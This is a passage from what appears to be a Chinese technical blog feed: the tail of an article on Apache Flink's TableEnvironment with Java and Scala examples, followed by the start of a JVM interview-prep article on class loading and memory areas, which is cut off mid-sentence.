punctuation">;</span>     <span class="token comment" spellcheck="true">// 或者</span>tableEnv<span class="token punctuation">.</span><span class="token function">registerExternalCatalog</span><span class="token punctuation">(</span><span class="token string">"extCat"</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//注册外部的Catalog目录</span><span class="token comment" spellcheck="true">//将datastream注册成一个 Table</span>tableEnv<span class="token punctuation">.</span><span class="token function">registerDataStream</span><span class="token punctuation">(</span><span class="token string">"stream1"</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//注册一个 udf</span>tableEnv<span class="token punctuation">.</span><span class="token function">registerFunction</span><span class="token punctuation">(</span><span class="token string">"addFun1"</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 从Table API的查询中创建一个Table</span>Table tabResult <span class="token operator">=</span> tableEnv<span class="token punctuation">.</span><span class="token function">scan</span><span class="token punctuation">(</span><span class="token string">"table1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 从SQL查询中创建一个Table</span>Table sqlResult <span class="token operator">=</span> tableEnv<span class="token punctuation">.</span><span class="token function">sqlQuery</span><span class="token punctuation">(</span><span class="token string">"SELECT ... FROM table2 ... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 用来更新执行Insert语句 目前值支持Insert</span>tableEnv<span class="token punctuation">.</span><span class="token function">sqlUpdate</span><span class="token punctuation">(</span><span class="token string">"SELECT ... FROM table2 ... "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 将Table API中的结果 Table 发射到TableSink中 , SQL查询也是一样的</span>tapiResult<span class="token punctuation">.</span><span class="token function">insertInto</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 执行</span>env<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Scala代码示例"><a href="#Scala代码示例" class="headerlink" title="Scala代码示例"></a>Scala代码示例</h2><pre class=" language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">// 对于批处理程序来说使用 ExecutionEnvironment 来替换 StreamExecutionEnvironment</span><span class="token keyword">val</span> env <span class="token operator">=</span> StreamExecutionEnvironment<span class="token punctuation">.</span>getExecutionEnvironment<span class="token comment" spellcheck="true">// 创建一个TableEnvironment</span><span class="token keyword">val</span> tableEnv <span class="token operator">=</span> TableEnvironment<span class="token punctuation">.</span>getTableEnvironment<span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 注册一个 Table</span>tableEnv<span class="token punctuation">.</span>registerTable<span class="token punctuation">(</span><span class="token string">"table1"</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">// 或者</span>tableEnv<span class="token punctuation">.</span>registerTableSource<span class="token punctuation">(</span><span class="token string">"table2"</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// 或者</span>tableEnv<span class="token punctuation">.</span>registerExternalCatalog<span class="token punctuation">(</span><span class="token string">"extCat"</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//注册外部的Catalog目录</span><span class="token comment" spellcheck="true">//将datastream注册成一个 Table</span>tableEnv<span class="token punctuation">.</span>registerDataStream<span class="token punctuation">(</span><span class="token string">"stream1"</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//注册一个 udf</span>tableEnv<span class="token punctuation">.</span>registerFunction<span class="token punctuation">(</span><span class="token string">"addFun1"</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 从Table API的查询中创建一个Table</span><span class="token keyword">val</span> tabResult <span class="token operator">=</span> tableEnv<span class="token punctuation">.</span>scan<span class="token punctuation">(</span><span class="token string">"table1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>select<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 从SQL查询中创建一个Table</span><span class="token keyword">val</span> sqlResult  <span class="token operator">=</span> tableEnv<span class="token punctuation">.</span>sqlQuery<span class="token punctuation">(</span><span class="token string">"SELECT ... FROM table2 ..."</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 用来更新执行Insert语句 目前值支持Insert</span>tableEnv<span class="token punctuation">.</span>sqlUpdate<span class="token punctuation">(</span><span class="token string">"SELECT ... FROM table2 ... "</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 将Table API中的结果 Table 发射到TableSink中 , SQL查询也是一样的</span>tapiResult<span class="token punctuation">.</span>insertInto<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 执行</span>env<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="二、理解TableEnvironment"><a href="#二、理解TableEnvironment" class="headerlink" title="二、理解TableEnvironment"></a>二、理解TableEnvironment</h1><p><strong>TableEnvironment</strong>是Table API和SQL集成的核心概念，从上面示例看出它主要负责:</p><ol><li>在内部目录中注册一个Table</li><li>注册一个外部目录</li><li>执行SQL查询或执行Insert语句更新</li><li>注册一个用户自定义函数(标量、表及聚合)</li><li>将DataStream或者DataSet转换成Table</li><li>将Table转换为DataSetDataStream或者DataSet</li><li>在已注册的表上指定SQL查询以获取Table</li><li><p>持有<strong>ExecutionEnvironment</strong>或者<strong>StreamExecutionEnvironment</strong>的引用</p><p><strong>注意</strong>：一个Table总是会绑定到一个指定的<strong><code>TableEnvironment</code></strong>中，相同的查询不同的<strong><code>TableEnvironment</code></strong>目前是无法通过join、union合并在一起。</p></li></ol><p>目前Flink1.7版本<strong><code>TableEnvironment</code></strong>从Java和Scala编程语言，流和批计算模型来来分为以下3个抽象类和4个实体类:</p><table><thead><tr><th>维度</th><th>类名</th></tr></thead><tbody><tr><td>抽象类</td><td>TableEnvironment(基类),StreamTableEnvironment和BatchTableEnvironment</td></tr><tr><td>Java</td><td>StreamTableEnvironment和BatchTableEnvironment（实体类）</td></tr><tr><td>Scala</td><td>StreamTableEnvironment和BatchTableEnvironment（实体类）</td></tr></tbody></table><p><strong><code>TableEnvironment</code></strong>的继承关系如下图所示（<a href="https://docs.google.com/document/d/1t-AUGuaChADddyJi6e0WLsTDEnf9ZkupvvBiQ4yTTEI/edit" target="_blank" rel="noopener">图片来源</a>） ：<br><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/filnk/TableEnvironment.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/filnk/TableEnvironment.png" alt="img"></a></p><h1 id="三、TableEnvironment的抽象与实现"><a href="#三、TableEnvironment的抽象与实现" class="headerlink" title="三、TableEnvironment的抽象与实现"></a>三、TableEnvironment的抽象与实现</h1><h2 id="1）TableEnvironment抽象类"><a href="#1）TableEnvironment抽象类" class="headerlink" title="1）TableEnvironment抽象类"></a>1）TableEnvironment抽象类</h2><p>TableEnvironment基类在源码<strong><code>org.apache.flink.table.api</code></strong>包中，StreamTableEnvironment和BatchTableEnvironment这两个抽象类继承于基类TableEnvironment。接下来先介绍TableEnvironment基类。</p><h3 id="1-TableEnvironment抽象基类"><a href="#1-TableEnvironment抽象基类" class="headerlink" title="1. TableEnvironment抽象基类"></a>1. TableEnvironment抽象基类</h3><pre class=" language-scala"><code class="language-scala"><span class="token comment" spellcheck="true">/**  * The abstract base class for batch and stream TableEnvironments.  *  * @param config The configuration of the TableEnvironment  */</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> TableEnvironment<span class="token punctuation">(</span><span class="token keyword">val</span> config<span class="token operator">:</span> TableConfig<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 用于保存所有已注册和已转换表的目录</span>  <span class="token comment" spellcheck="true">// 这里禁用缓存以防止副作用</span>  <span class="token keyword">private</span> <span class="token keyword">val</span> internalSchema<span class="token operator">:</span> CalciteSchema <span class="token operator">=</span> CalciteSchema<span class="token punctuation">.</span>createRootSchema<span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>  <span class="token keyword">private</span> <span class="token keyword">val</span> rootSchema<span class="token operator">:</span> SchemaPlus <span class="token operator">=</span> internalSchema<span class="token punctuation">.</span>plus<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// Table API/SQL 函数目录</span>  <span class="token keyword">private</span><span class="token punctuation">[</span>flink<span class="token punctuation">]</span> <span class="token keyword">val</span> functionCatalog<span class="token operator">:</span> FunctionCatalog <span class="token operator">=</span> FunctionCatalog<span class="token punctuation">.</span>withBuiltIns  <span class="token comment" spellcheck="true">// 用于创建Calcite计划程序的配置</span>  <span class="token keyword">private</span> <span class="token keyword">lazy</span> <span class="token keyword">val</span> frameworkConfig<span class="token operator">:</span> FrameworkConfig <span class="token operator">=</span> Frameworks    <span class="token punctuation">.</span>newConfigBuilder    <span class="token punctuation">.</span>defaultSchema<span class="token punctuation">(</span>rootSchema<span class="token punctuation">)</span>    <span class="token punctuation">.</span>parserConfig<span class="token punctuation">(</span>getSqlParserConfig<span class="token punctuation">)</span>    <span class="token punctuation">.</span>costFactory<span class="token punctuation">(</span><span class="token keyword">new</span> DataSetCostFactory<span class="token punctuation">)</span>    <span class="token punctuation">.</span>typeSystem<span class="token punctuation">(</span><span class="token keyword">new</span> FlinkTypeSystem<span class="token punctuation">)</span>    <span class="token punctuation">.</span>operatorTable<span class="token punctuation">(</span>getSqlOperatorTable<span class="token punctuation">)</span>    <span class="token punctuation">.</span>sqlToRelConverterConfig<span class="token punctuation">(</span>getSqlToRelConverterConfig<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//设定executor用来执行常量表达式</span>    <span class="token punctuation">.</span>executor<span class="token punctuation">(</span><span class="token keyword">new</span> ExpressionReducer<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span>build  <span class="token comment" spellcheck="true">// 构建Calcite的RelNodes(相关结点),可以用来获取和表示Calcite的一个关系表达式树.</span>  <span class="token keyword">protected</span> <span class="token keyword">lazy</span> <span class="token keyword">val</span> relBuilder<span class="token operator">:</span> FlinkRelBuilder <span class="token operator">=</span> FlinkRelBuilder<span class="token punctuation">.</span>create<span class="token punctuation">(</span>frameworkConfig<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 用于优化此TableEnvironment查询的planner实例</span>  <span class="token keyword">private</span> <span class="token keyword">lazy</span> <span class="token keyword">val</span> planner<span class="token operator">:</span> RelOptPlanner <span class="token operator">=</span> relBuilder<span class="token punctuation">.</span>getPlanner  <span class="token keyword">private</span> <span class="token keyword">lazy</span> <span class="token keyword">val</span> typeFactory<span class="token operator">:</span> FlinkTypeFactory <span class="token operator">=</span> relBuilder<span class="token punctuation">.</span>getTypeFactory  <span class="token comment" spellcheck="true">// 一个属性名称唯一的计数器</span>  <span class="token keyword">private</span><span class="token punctuation">[</span>flink<span class="token punctuation">]</span> <span class="token keyword">val</span> attrNameCntr<span class="token operator">:</span> AtomicInteger <span class="token operator">=</span> <span class="token keyword">new</span> AtomicInteger<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 注册外部catalog名到catalog中</span>  <span class="token keyword">private</span> <span class="token keyword">val</span> externalCatalogs <span class="token operator">=</span> <span class="token keyword">new</span> mutable<span class="token punctuation">.</span>HashMap<span class="token punctuation">[</span><span class="token builtin">String</span><span class="token punctuation">,</span> ExternalCatalog<span class="token punctuation">]</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span></code></pre><p>从上面源码中可以看出<strong><code>TableEnvironment</code></strong>抽象基类主要通过传入的<strong><code>TableConfig</code></strong>创建了一个<strong><code>FlinkRelBuilder</code></strong>，熟悉<strong><code>Calcite</code></strong>的人对这个<strong><code>RelBuilder</code></strong>应该很熟悉，后面会写文章专门讲解<strong><code>Calcite</code></strong>。这个<strong><code>RelBuilder</code></strong>可以用来获取关系表达式树，获取查询优化<strong><code>RelOptPlanner</code></strong>，获取<strong><code>typeFactory</code></strong>。除此之外还定义了<strong><code>fromTableSource</code></strong>，<strong><code>scan</code></strong>，<strong><code>registerTable</code></strong>，<strong><code>sqlQuery</code></strong>，<strong><code>registerTableSink</code></strong>等操作方法。</p><h3 id="2-StreamTableEnvironment抽象类"><a href="#2-StreamTableEnvironment抽象类" class="headerlink" title="2. StreamTableEnvironment抽象类"></a>2. StreamTableEnvironment抽象类</h3><h3 id="3-BatchTableEnvironment抽象类"><a href="#3-BatchTableEnvironment抽象类" class="headerlink" title="3. BatchTableEnvironment抽象类"></a>3. BatchTableEnvironment抽象类</h3><h2 id="2）TableEnvironment实体类"><a href="#2）TableEnvironment实体类" class="headerlink" title="2）TableEnvironment实体类"></a>2）TableEnvironment实体类</h2><p>从之前示例和上面源码中可以知道，TableEnvironment通过调用带有参数<strong>StreamExecutionEnvironment</strong>或者<strong>ExecutionEnvironment</strong>和一个可选参数TableConfig的静态方法<strong>TableEnvironment.getTableEnvironment()</strong>来创建。<strong>TableConfig</strong>可以用来配置<strong>TableEnvironment</strong>或者自定义查询优化器和转换过程(参考<a href="https://link.jianshu.com?t=https://ci.apache.org/projects/flink/flink-docs-release-1.7/dev/table/common.html#query-optimization" target="_blank" rel="noopener">查询优化器</a>)。</p><p><a href="https://www.jianshu.com/p/6bc5b4e6f163" target="_blank" rel="noopener">参考1</a> </p><h1 id="四、正在讨论及改进"><a href="#四、正在讨论及改进" class="headerlink" title="四、正在讨论及改进"></a>四、正在讨论及改进</h1><p>目前发现因为<strong><code>TableEnvironment</code></strong>很多版本，这就造成了用户在选择使用<strong><code>TableEnvironment</code></strong>不知道选取哪一个，为了统一和简化对用户的操作目前社区正在讨论，详细内容请看下面连接： <a href="https://docs.google.com/document/d/1t-AUGuaChADddyJi6e0WLsTDEnf9ZkupvvBiQ4yTTEI/edit" target="_blank" rel="noopener">讨论及改进。</a></p>]]></content>
      
      
      <categories>
          
          <category> flink </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flink-Table-SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试系列-Jvm看这篇就够了</title>
      <link href="/2018/12/29/mian-shi-xi-lie/mian-shi-xi-lie-jvm-kan-zhe-pian-jiu-gou-liao/"/>
      <url>/2018/12/29/mian-shi-xi-lie/mian-shi-xi-lie-jvm-kan-zhe-pian-jiu-gou-liao/</url>
      
        <content type="html"><![CDATA[<h2 id="面试系列-Jvm看这篇就够了"><a href="#面试系列-Jvm看这篇就够了" class="headerlink" title="面试系列-Jvm看这篇就够了"></a>面试系列-Jvm看这篇就够了</h2><h3 id="一-JVM基础知识"><a href="#一-JVM基础知识" class="headerlink" title="一.  JVM基础知识"></a><strong>一.  JVM基础知识</strong></h3><h4 id="1）Java-是如何实现跨平台的？"><a href="#1）Java-是如何实现跨平台的？" class="headerlink" title="1）Java 是如何实现跨平台的？"></a>1）Java 是如何实现跨平台的？</h4><p><strong>注意：跨平台的是 Java 程序，而不是 JVM。JVM 是用 C/C++ 开发的，是编译后的机器码，不能跨平台，不同平台下需要安装不同版本的 JVM</strong></p><p>答：我们编写的 Java 源码，编译后会生成一种 .class 文件，称为字节码文件。Java 虚拟机（JVM）就是负责将字节码文件翻译成特定平台下的机器码然后运行，也就是说，只要在不同平台上安装对应的 JVM，就可以运行字节码文件，运行我们编写的 Java 程序。</p><p>而这个过程，我们编写的 Java 程序没有做任何改变，仅仅是通过 JVM 这一 “中间层” ，就能在不同平台上运行，真正实现了 “一次编译，到处运行” 的目的。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/1.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/1.png" alt="img"></a></p><h4 id="2）什么是-JVM-？"><a href="#2）什么是-JVM-？" class="headerlink" title="2）什么是 JVM ？"></a>2）什么是 JVM ？</h4><p>解析：不仅仅是基本概念，还有 JVM 的作用。</p><p>答：JVM，即 Java Virtual Machine，Java 虚拟机。它通过模拟一个计算机来达到一个计算机所具有的的计算功能。JVM 能够跨计算机体系结构来执行 Java 字节码，主要是由于 JVM 屏蔽了与各个计算机平台相关的软件或者硬件之间的差异，使得与平台相关的耦合统一由 JVM 提供者来实现。</p><h4 id="3）JVM-由哪些部分组成？"><a href="#3）JVM-由哪些部分组成？" class="headerlink" title="3）JVM 由哪些部分组成？"></a>3）JVM 由哪些部分组成？</h4><p>解析：这是对 JVM 体系结构的考察</p><p>答：JVM 的结构基本上由 4 部分组成：</p><ul><li>类加载器，在 JVM 启动时或者类运行时将需要的 class 加载到 JVM 中</li><li>执行引擎，执行引擎的任务是负责执行 class 文件中包含的字节码指令，相当于实际机器上的 CPU</li><li>内存区，将内存划分成若干个区以模拟实际机器上的存储、记录和调度功能模块，如实际机器上的各种功能的寄存器或者 PC 指针的记录器等</li><li>本地方法调用，调用 C 或 C++ 实现的本地方法的代码返回结果</li></ul><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/2.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/2.png" alt="img"></a></p><h4 id="4）类加载器是有了解吗？"><a href="#4）类加载器是有了解吗？" class="headerlink" title="4）类加载器是有了解吗？"></a>4）类加载器是有了解吗？</h4><p>解析：底层原理的考察，其中涉及到类加载器的概念，功能以及一些底层的实现。</p><p>答：顾名思义，类加载器（class loader）用来加载 Java 类到 Java 虚拟机中。一般来说，Java 虚拟机使用 Java 类的方式如下：Java 源程序（.java 文件）在经过 Java 编译器编译之后就被转换成 Java 字节代码（.class 文件）。</p><p>类加载器负责读取 Java 字节代码，并转换成 java.lang.Class类的一个实例。每个这样的实例用来表示一个 Java 类。通过此实例的 newInstance()方法就可以创建出该类的一个对象。实际的情况可能更加复杂，比如 Java 字节代码可能是通过工具动态生成的，也可能是通过网络下载的。</p><p><strong>面试官：Java 虚拟机是如何判定两个 Java 类是相同的？</strong></p><p>答：Java 虚拟机不仅要看类的全名是否相同，还要看加载此类的类加载器是否一样。只有两者都相同的情况，才认为两个类是相同的。即便是同样的字节代码，被不同的类加载器加载之后所得到的类，也是不同的。比如一个 Java 类 com.example.Sample，编译之后生成了字节代码文件 Sample.class。两个不同的类加载器 ClassLoaderA和 ClassLoaderB分别读取了这个 Sample.class文件，并定义出两个 java.lang.Class类的实例来表示这个类。这两个实例是不相同的。对于 Java 虚拟机来说，它们是不同的类。试图对这两个类的对象进行相互赋值，会抛出运行时异常 ClassCastException。</p><h4 id="5）类加载器是如何加载-class-文件的？"><a href="#5）类加载器是如何加载-class-文件的？" class="headerlink" title="5）类加载器是如何加载 class 文件的？"></a>5）类加载器是如何加载 class 文件的？</h4><p>答：下图所示是 ClassLoader 加载一个 class 文件到 JVM 时需要经过的步骤：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/3.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/3.png" alt="img"></a></p><p>第一个阶段是找到 .class 文件并把这个文件包含的字节码加载到内存中</p><p>第二阶段又可以分为三个步骤，分别是字节码验证、Class 类数据结构分析及相应的内存分配和最后的符号表的链接</p><p>第三个阶段是类中静态属性和初始化赋值，以及静态块的执行等</p><p><strong>面试官：能详细讲讲吗？</strong></p><p>答：</p><p><strong>1.加载</strong></p><p>查找并加载类的二进制数据加载时类加载过程的第一个阶段，在加载阶段，虚拟机需要完成以下三件事情：</p><ul><li>通过一个类的全限定名来获取其定义的二进制字节流。</li><li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。</li><li>在Java堆中生成一个代表这个类的 java.lang.Class 对象，作为对方法区中这些数据的访问入口。</li></ul><p>相对于类加载的其他阶段而言，加载阶段（准确地说，是加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，因为开发人员既可以使用系统提供的类加载器来完成加载，也可以自定义自己的类加载器来完成加载。</p><p>加载阶段完成后，虚拟机外部的二进制字节流就按照虚拟机所需的格式存储在方法区之中，而且在Java堆中也创建一个 java.lang.Class类的对象，这样便可以通过该对象访问方法区中的这些数据。</p><p><strong>2.连接</strong></p><p><strong>验证：确保被加载的类的正确性</strong></p><p>验证是连接阶段的第一步，这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。验证阶段大致会完成4个阶段的检验动作：</p><ul><li><strong>文件格式验证：</strong>验证字节流是否符合Class文件格式的规范；例如：是否以 0xCAFEBABE开头、主次版本号是否在当前虚拟机的处理范围之内、常量池中的常量是否有不被支持的类型。</li><li><strong>元数据验证：</strong>对字节码描述的信息进行语义分析（注意：对比javac编译阶段的语义分析），以保证其描述的信息符合Java语言规范的要求；例如：这个类是否有父类，除了 java.lang.Object之外。</li><li><strong>字节码验证：</strong>通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。</li><li><strong>符号引用验证：</strong>确保解析动作能正确执行。</li></ul><p>验证阶段是非常重要的，但不是必须的，它对程序运行期没有影响，如果所引用的类经过反复验证，那么可以考虑采用 -Xverifynone 参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间。</p><p><strong>准备：为类的静态变量分配内存，并将其初始化为默认值</strong></p><p>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些内存都将在方法区中分配。对于该阶段有以下几点需要注意：</p><ul><li>① 这时候进行内存分配的仅包括类变量（static），而不包括实例变量，实例变量会在对象实例化时随着对象一块分配在Java堆中。</li><li>② 这里所设置的初始值通常情况下是数据类型默认的零值（如0、0L、null、false等），而不是被在Java代码中被显式地赋予的值。</li></ul><p>假设一个类变量的定义为： <code>public static int value = 3;</code></p><p>那么变量value在准备阶段过后的初始值为 0，而不是 3，因为这时候尚未开始执行任何 Java 方法，而把 value 赋值为 3 的<code>public static</code>指令是在程序编译后，存放于类构造器 <code>&lt;clinit&gt;（）</code>方法之中的，所以把value赋值为3的动作将在初始化阶段才会执行。</p><blockquote><p>这里还需要注意如下几点：</p><ul><li>对基本数据类型来说，对于类变量（static）和全局变量，如果不显式地对其赋值而直接使用，则系统会为其赋予默认的零值，而对于局部变量来说，在使用前必须显式地为其赋值，否则编译时不通过。</li><li>对于同时被static和final修饰的常量，必须在声明的时候就为其显式地赋值，否则编译时不通过；而只被final修饰的常量则既可以在声明时显式地为其赋值，也可以在类初始化时显式地为其赋值，总之，在使用前必须为其显式地赋值，系统不会为其赋予默认零值。</li><li>对于引用数据类型reference来说，如数组引用、对象引用等，如果没有对其进行显式地赋值而直接使用，系统都会为其赋予默认的零值，即null。</li><li>如果在数组初始化时没有对数组中的各元素赋值，那么其中的元素将根据对应的数据类型而被赋予默认的零值。</li></ul></blockquote><ul><li>③ 如果类字段的字段属性表中存在 ConstantValue 属性，即同时被 final 和 static 修饰，那么在准备阶段变量 value 就会被初始化为 ConstValue 属性所指定的值。</li></ul><p>假设上面的类变量 value 被定义为： <code>public static final int value = 3;</code></p><p>编译时 Javac 将会为 value 生成 ConstantValue 属性，在准备阶段虚拟机就会根据 ConstantValue 的设置将 value 赋值为 3。我们可以理解为 static final 常量在编译期就将其结果放入了调用它的类的常量池中</p><p><strong>解析：把类中的符号引用转换为直接引用</strong></p><p>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程，解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行。符号引用就是一组符号来描述目标，可以是任何字面量。</p><p>直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。</p><p><strong>3.初始化</strong></p><p>初始化，为类的静态变量赋予正确的初始值，JVM负责对类进行初始化，主要对类变量进行初始化。在Java中对类变量进行初始值设定有两种方式：</p><ul><li>① 声明类变量是指定初始值</li><li>② 使用静态代码块为类变量指定初始值</li></ul><p>JVM初始化步骤</p><ul><li>1、假如这个类还没有被加载和连接，则程序先加载并连接该类</li><li>2、假如该类的直接父类还没有被初始化，则先初始化其直接父类</li><li>3、假如类中有初始化语句，则系统依次执行这些初始化语句</li></ul><p>类初始化时机：只有当对类的主动使用的时候才会导致类的初始化，类的主动使用包括以下六种：</p><ul><li>创建类的实例，也就是new的方式</li><li>访问某个类或接口的静态变量，或者对该静态变量赋值</li><li>调用类的静态方法</li><li>反射（如 Class.forName(“com.shengsiyuan.Test”)）</li><li>初始化某个类的子类，则其父类也会被初始化</li><li>Java虚拟机启动时被标明为启动类的类（ JavaTest），直接使用 java.exe命令来运行某个主类</li></ul><p><strong>结束生命周期</strong></p><p>在如下几种情况下，Java虚拟机将结束生命周期</p><ul><li>执行了 System.exit()方法</li><li>程序正常执行结束</li><li>程序在执行过程中遇到了异常或错误而异常终止</li><li>由于操作系统出现错误而导致Java虚拟机进程终止</li></ul><blockquote><p>参考文章：<a href="https://mp.weixin.qq.com/s?__biz=MzI4NDY5Mjc1Mg==&amp;mid=2247483934&amp;idx=1&amp;sn=41c46eceb2add54b7cde9eeb01412a90&amp;chksm=ebf6da61dc81537721d36aadb5d20613b0449762842f9128753e716ce5fefe2b659d8654c4e8&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">jvm系列(一):java类的加载机制 - 纯洁的微笑</a></p></blockquote><h4 id="7）双亲委派模型（Parent-Delegation-Model）？"><a href="#7）双亲委派模型（Parent-Delegation-Model）？" class="headerlink" title="7）双亲委派模型（Parent Delegation Model）？"></a>7）双亲委派模型（Parent Delegation Model）？</h4><p>解析：类的加载过程采用双亲委派机制，这种机制能更好的保证 Java 平台的安全性</p><p>答：类加载器 ClassLoader 是具有层次结构的，也就是父子关系，其中，Bootstrap 是所有类加载器的父亲，如下图所示：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/4.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/4.png" alt="img"></a></p><p>该模型要求除了顶层的 Bootstrap class loader 启动类加载器外，其余的类加载器都应当有自己的父类加载器。子类加载器和父类加载器不是以继承（Inheritance）的关系来实现，而是通过组合（Composition）关系来复用父加载器的代码。每个类加载器都有自己的命名空间（由该加载器及所有父类加载器所加载的类组成，在同一个命名空间中，不会出现类的完整名字（包括类的包名）相同的两个类；在不同的命名空间中，有可能会出现类的完整名字（包括类的包名）相同的两个类）</p><p><strong>面试官：双亲委派模型的工作过程？</strong></p><p>答：</p><p>1.当前 ClassLoader 首先从自己已经加载的类中查询是否此类已经加载，如果已经加载则直接返回原来已经加载的类。</p><blockquote><p>每个类加载器都有自己的加载缓存，当一个类被加载了以后就会放入缓存，<br>等下次加载的时候就可以直接返回了。</p></blockquote><p>2.当前 ClassLoader 的缓存中没有找到被加载的类的时候，委托父类加载器去加载，父类加载器采用同样的策略，首先查看自己的缓存，然后委托父类的父类去加载，一直到 bootstrap ClassLoader.</p><blockquote><p>当所有的父类加载器都没有加载的时候，再由当前的类加载器加载，并将其放入它自己的缓存中，以便下次有加载请求的时候直接返回。</p></blockquote><p><strong>面试官：为什么这样设计呢？</strong></p><p>解析：这是对于使用这种模型来组织累加器的好处</p><p>答：主要是为了安全性，避免用户自己编写的类动态替换 Java 的一些核心类，比如 String，同时也避免了重复加载，因为 JVM 中区分不同类，不仅仅是根据类名，相同的 class 文件被不同的 ClassLoader 加载就是不同的两个类，如果相互转型的话会抛java.lang.ClassCaseException.</p><h3 id="二-JVM内存管理"><a href="#二-JVM内存管理" class="headerlink" title="二.  JVM内存管理"></a><strong>二.  JVM内存管理</strong></h3><h4 id="1）JVM-内存划分："><a href="#1）JVM-内存划分：" class="headerlink" title="1）JVM 内存划分："></a>1）JVM 内存划分：</h4><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/interview/5.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/interview/5.png" alt="img"></a></p><p>答：</p><ol><li><p>方法区（线程共享）：各个线程共享的一个区域，用于存储虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。虽然 Java 虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却又一个别名叫做 Non-Heap（非堆），目的应该是与 Java 